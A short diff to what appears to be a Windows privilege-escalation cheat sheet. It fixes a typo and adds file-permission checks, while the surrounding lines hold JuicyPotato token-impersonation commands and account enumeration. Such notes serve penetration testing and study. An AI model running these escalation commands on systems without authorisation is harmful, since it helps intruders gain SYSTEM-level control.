@@ -1029,10 +1029,14 @@ net user {USERNAME}
 # Check UAC level
 whoami /groups
 
-# Check Privledges for Impersonation
+# Check Privileges for Impersonation
 whoami /priv
 JuicyPotato.exe -t * -p {run.exe} -l 8003
 JuicyPotato.exe -t * -p {run.exe} -l 8003 -c {CLSID}
+
+# Check File Permissions
+Get-ACL {FILE or DIR} | fl
+icacls {FILE}
 
 # Powershell
 cmd /c "JuicyPotato.exe -t * -p run.exe -l 8003 -c {CLSID}"
